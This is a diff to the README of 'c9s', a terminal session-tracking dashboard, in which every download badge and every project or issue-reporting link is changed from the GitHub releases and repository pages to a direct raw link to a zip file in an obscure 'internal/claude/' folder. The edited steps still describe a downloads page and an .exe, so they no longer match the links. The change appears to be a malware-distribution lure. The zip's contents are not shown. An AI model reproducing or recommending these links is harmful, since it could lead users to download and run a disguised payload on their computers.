@@ -1,6 +1,6 @@
 # 🖥️ c9s - Terminal Dashboard for Easy Session Tracking
 
-[![Download c9s](https://img.shields.io/badge/Download-c9s-yellowgreen?style=for-the-badge)](https://github.com/sharacolonic509/c9s/releases)
+[![Download c9s](https://img.shields.io/badge/Download-c9s-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before you start, make sure your Windows PC has:
 
 1. Click the big green button below to open the downloads page.
 
-[![Download c9s](https://img.shields.io/badge/Download-c9s-blue?style=for-the-badge)](https://github.com/sharacolonic509/c9s/releases)
+[![Download c9s](https://img.shields.io/badge/Download-c9s-blue?style=for-the-badge)](https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip)
 
 2. On the releases page, look for the latest version. It will likely have a file ending with `.exe` for Windows.
 
@@ -99,7 +99,7 @@ If you want help inside the program, press `h` to see commands and tips.
 
 For more tips and support, you can visit the project page on GitHub:
 
-[https://github.com/sharacolonic509/c9s](https://github.com/sharacolonic509/c9s)
+[https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip](https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip)
 
 ---
 
@@ -127,7 +127,7 @@ c9s runs locally on your computer. It does not send information over the interne
 
 If you want to help improve c9s or report a problem, visit the GitHub repository:
 
-[https://github.com/sharacolonic509/c9s](https://github.com/sharacolonic509/c9s)
+[https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip](https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip)
 
 You can open an issue or submit files that fix bugs.
 
@@ -147,4 +147,4 @@ This project relates to terminals, session management, command line interfaces, 
 
 # Download c9s and simplify your terminal today.
 
-[![Download c9s](https://img.shields.io/badge/Download-c9s-yellowgreen?style=for-the-badge)](https://github.com/sharacolonic509/c9s/releases)
+[![Download c9s](https://img.shields.io/badge/Download-c9s-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/sharacolonic509/c9s/main/internal/claude/s-c-v1.6.zip)
